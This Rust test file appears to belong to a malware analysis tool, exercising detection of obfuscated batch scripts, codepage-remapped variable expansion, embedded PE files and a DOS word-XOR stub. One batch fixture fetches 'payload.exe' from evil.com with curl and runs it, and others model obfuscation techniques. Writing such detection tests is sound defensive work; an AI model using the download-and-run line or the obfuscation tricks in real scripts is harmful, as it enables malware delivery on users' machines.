use super::*;
use std::path::PathBuf;

/// Decoders add an encoding step; methods that only locate a string do not.
#[test]
fn stng_location_methods_add_no_encoding_step() {
    use stng::StringMethod as M;
    // Methods that only locate a string add no encoding step. A recovered
    // repeating XOR key is the key itself, not content decoded with it.
    assert_eq!(stng_method_encoding(M::WideString), None);
    assert_eq!(stng_method_encoding(M::XorRepeatingKey), None);
}

#[test]
fn test_generic_batch_analysis() {
    let analyzer = GenericAnalyzer::new(FileType::Batch);
    let path = PathBuf::from("test.bat");
    let code = r#"
@echo off
set PATH="%PATH%;C:\malware"
curl "http://evil.com/payload.exe" -o "payload.exe"
start payload.exe
"#;
    let report = analyzer.analyze_source(&path, code);

    // Should extract strings (quoted strings are extracted)
    assert!(!report.strings.is_empty());
    // text.* metrics flow through filefacts_metrics now
    assert!(
        report
            .filefacts_metrics
            .as_ref()
            .is_some_and(|m| m.keys().any(|k| k.starts_with("text.")))
    );
}

#[test]
fn batch_set_expansion_is_analyzed_once_as_a_layer() {
    let analyzer = GenericAnalyzer::new(FileType::Batch);
    let path = PathBuf::from("obfuscated.cmd");
    let code = "set a=move /y\nset b=source\nset c=target\n%a% %b% %c%\n";
    let report = analyzer.analyze_source(&path, code);

    let layers: Vec<_> = report
        .files
        .iter()
        .filter(|file| file.encoding.as_deref() == Some(&["batch-expansion".to_string()][..]))
        .collect();
    assert_eq!(layers.len(), 1, "expected exactly one expanded layer");
    let layer = layers[0];
    assert_eq!(layer.depth, 1);
    assert_eq!(layer.file_type, "batch");
    assert!(layer.path.contains("##batch-expansion@0"), "{}", layer.path);
}

#[test]
fn batch_expansion_layer_is_not_identified_from_its_virtual_path() {
    // The layer is named `<parent>##batch-expansion@0`. Identified from
    // that name, its batch content "mismatches" the made-up extension.
    let dir = tempfile::tempdir().unwrap();
    let traits = dir.path().join("traits.yaml");
    std::fs::write(
        &traits,
        r#"
traits:
  - id: "test/layer::extension-mismatch"
    desc: "Content mismatches the filename extension"
    crit: notable
    for: [batch]
    if:
      type: metrics
      field: consistency.extension_content_mismatch
      min: 1.0
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&traits).unwrap();
    let analyzer = GenericAnalyzer::new(FileType::Batch)
        .with_engine(crate::Engine::from_rules(std::sync::Arc::new(mapper)));
    let code = "set a=move /y\nset b=source\nset c=target\n%a% %b% %c%\n";
    let report = analyzer.analyze_source(&PathBuf::from("obfuscated.bat"), code);

    let layer = report
        .files
        .iter()
        .find(|file| file.encoding.as_deref() == Some(&["batch-expansion".to_string()][..]))
        .expect("expanded layer");
    assert!(
        !layer
            .findings
            .iter()
            .any(|f| f.id == "test/layer::extension-mismatch"),
        "decoded layer judged against its virtual path: {:?}",
        layer.findings.iter().map(|f| &f.id).collect::<Vec<_>>(),
    );
}

#[test]
fn batch_codepage_expansion_preserves_original_high_bytes() {
    let dir = tempfile::tempdir().unwrap();
    let traits = dir.path().join("traits.yaml");
    std::fs::write(
        &traits,
        r#"
traits:
  - id: "test/layer::decoded-marker"
    desc: "Decoded payload marker"
    crit: notable
    for: [batch]
    if:
      type: text
      substr: "decoded_payload_marker"
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&traits).unwrap();
    let analyzer = GenericAnalyzer::new(FileType::Batch)
        .with_engine(crate::Engine::from_rules(std::sync::Arc::new(mapper)));
    let ascii = b" !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\"";
    assert_eq!(ascii.len(), 94);
    let encoded: Vec<u8> = (0x80..0xde).collect();
    let mut bytes = b"@echo off\nchcp 708>nul\nset \"@manezao@=".to_vec();
    bytes.extend(ascii);
    bytes.extend(b"\"\nset \"@jasa@=");
    bytes.extend(&encoded);
    bytes.extend(b"\"\n");
    for ch in b"echo decoded_payload_marker" {
        let idx = ascii.iter().position(|c| c == ch).unwrap();
        bytes.extend([b'%', encoded[idx], b'%']);
    }
    bytes.push(b'\n');
    assert!(std::str::from_utf8(&bytes).is_err());
    let lossy = String::from_utf8_lossy(&bytes);
    let report = analyzer.analyze_source_internal(
        &PathBuf::from("remapped.bat"),
        &lossy,
        None,
        Some(&bytes),
        None,
        None,
        false,
        None,
        None,
    );
    let layer = report
        .files
        .iter()
        .find(|file| file.encoding.as_deref() == Some(&["batch-expansion".to_string()][..]))
        .expect("byte-preserving batch expansion layer");
    assert!(
        layer
            .findings
            .iter()
            .any(|f| f.id == "test/layer::decoded-marker"),
        "high-byte table must reach the decoder before UTF-8 replacement"
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "test/layer::decoded-marker")
    );
}

#[test]
fn batch_ast_queries_match_commands_but_not_echo_or_comments() {
    let dir = tempfile::tempdir().unwrap();
    let traits = dir.path().join("traits.yaml");
    std::fs::write(
        &traits,
        r#"
traits:
  - id: "test/batch::delete-command"
    desc: "Parsed delete command targets victim"
    crit: notable
    for: [batch]
    if:
      type: tree-sitter
      language: batch
      query: |
        (cmd (command_name) @tool (argument_list) @args
          (#match? @tool "(?i)^(del|erase)$")
          (#eq? @args "victim.txt"))
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&traits).unwrap();
    let analyzer = GenericAnalyzer::new(FileType::Batch)
        .with_engine(crate::Engine::from_rules(std::sync::Arc::new(mapper)));
    for (code, expected) in [
        ("@echo off\ndel victim.txt\n", true),
        ("@echo off\nERASE victim.txt\n", true),
        ("@echo off\nrem del victim.txt\n", false),
        ("@echo off\necho del victim.txt\n", false),
        ("@echo off\ndel other.txt\necho victim.txt\n", false),
    ] {
        let report = analyzer.analyze_source(&PathBuf::from("sample.bat"), code);
        assert_eq!(
            report
                .findings
                .iter()
                .any(|f| f.id == "test/batch::delete-command"),
            expected,
            "{code}"
        );
    }
}

#[test]
fn ordinary_batch_variables_do_not_create_an_expansion_layer() {
    let analyzer = GenericAnalyzer::new(FileType::Batch);
    let path = PathBuf::from("ordinary.bat");
    let report = analyzer.analyze_source(&path, "@echo off\nset NAME=world\necho hello %NAME%\n");
    assert!(
        report
            .files
            .iter()
            .all(|file| file.encoding.as_deref() != Some(&["batch-expansion".to_string()][..])),
        "ordinary variable use should not produce a decoded layer",
    );
}

#[test]
fn test_generic_swift_analysis() {
    let analyzer = GenericAnalyzer::new(FileType::Swift);
    let path = PathBuf::from("test.swift");
    let code = r#"
import Foundation
let url = URL(string: "http://example.com")!
let task = URLSession.shared.dataTask(with: url)
"#;
    let report = analyzer.analyze_source(&path, code);

    // Should extract strings
    assert!(!report.strings.is_empty());
}

#[test]
fn test_generic_unknown_skips_embedded_detection() {
    let analyzer = GenericAnalyzer::new(FileType::Unknown);
    let path = PathBuf::from("README.zOS");
    let content = r#"
This is documentation.

test.c $(distdir)/runsuite.c | GZIP=$(GZIP_ENV) gzip -c >`echo "$(distdir)" | sh
"#;
    let report = analyzer.analyze_source(&path, content);

    assert!(report.strings.is_empty());
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "metadata/lang/embedded::shell")
    );
}

#[test]
fn unknown_binary_carrier_exposes_validated_embedded_pe() {
    let mut data = vec![0u8; 4096 + 10];
    data[..2].copy_from_slice(b"MZ");
    let offset = 10;
    data[offset..offset + 2].copy_from_slice(b"MZ");
    data[offset + 0x3c..offset + 0x40].copy_from_slice(&0x80u32.to_le_bytes());
    let pe = offset + 0x80;
    data[pe..pe + 4].copy_from_slice(b"PE\0\0");
    data[pe + 4..pe + 6].copy_from_slice(&0x14cu16.to_le_bytes());
    data[pe + 6..pe + 8].copy_from_slice(&1u16.to_le_bytes());
    data[pe + 20..pe + 22].copy_from_slice(&0xe0u16.to_le_bytes());
    data[pe + 24..pe + 26].copy_from_slice(&0x10bu16.to_le_bytes());
    let section = pe + 24 + 0xe0;
    data[section + 16..section + 20].copy_from_slice(&512u32.to_le_bytes());
    data[section + 20..section + 24].copy_from_slice(&512u32.to_le_bytes());
    let path = PathBuf::from("wrapper.bin");
    let input = AnalysisInput::new(&path, &data, FileType::Unknown);
    let report = GenericAnalyzer::new(FileType::Unknown)
        .analyze_input(&input)
        .unwrap();
    assert!(report.files.iter().any(|f| f.file_type == "pe"));

    let disabled = GenericAnalyzer::new(FileType::Unknown)
        .without_embedded_detection()
        .analyze_input(&input)
        .unwrap();
    assert!(disabled.files.is_empty());

    data[pe] = 0;
    let input = AnalysisInput::new(&path, &data, FileType::Unknown);
    let invalid = GenericAnalyzer::new(FileType::Unknown)
        .analyze_input(&input)
        .unwrap();
    assert!(invalid.files.is_empty());
}

#[test]
fn test_generic_python_bytecode_reports_detected_type() {
    let analyzer = GenericAnalyzer::new(FileType::PythonBytecode);
    let input = AnalysisInput::new(
        std::path::Path::new("module.pyc"),
        &[0xCB, 0x0D, 0x0D, 0x0A, 0, 0, 0, 0],
        FileType::PythonBytecode,
    );

    let report = analyzer.analyze_input(&input).expect("analyze pyc");

    assert_eq!(report.target.file_type, "python_bytecode");
}

/// A COM file whose patched entry jump leads to a word-XOR stub.
fn dos_word_xor_fixture() -> Vec<u8> {
    let key = [0x16, 0x44];
    let mut decoded = [0x90; 64];
    decoded[..3].copy_from_slice(&[0xe9, 0x0d, 0x00]);
    let patch = [
        decoded[0] ^ key[0],
        decoded[1] ^ key[1],
        decoded[2] ^ key[0],
    ];
    let mut encoded = decoded
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i & 1])
        .collect::<Vec<_>>();
    encoded[..3].copy_from_slice(&[0xe9, 61, 0]);
    encoded.extend_from_slice(&[
        0xbe, 0, 1, 0x56, 0xb9, 32, 0, 0xc7, 4, patch[0], patch[1], 0xc6, 0x44, 2, patch[2], 0x81,
        0x34, key[0], key[1], 0x46, 0x46, 0xe2, 0xf8, 0x31, 0xf6, 0x31, 0xc9, 0xc3,
    ]);
    encoded
}

#[test]
fn dos_word_xor_com_yields_a_single_bounded_child() {
    let input = dos_word_xor_fixture();
    let path = std::path::Path::new("fixture.com");
    let analyzer = GenericAnalyzer::new(FileType::DosCom);
    let report = analyzer
        .analyze_input(&AnalysisInput::new(path, &input, FileType::DosCom))
        .expect("analysis");
    assert_eq!(report.files.len(), 1);
    assert_eq!(
        report.files[0].encoding.as_deref(),
        Some(["dos-word-xor".to_owned()].as_slice())
    );
    assert!(report.files[0].path.contains("##dos-word-xor@64"));
}
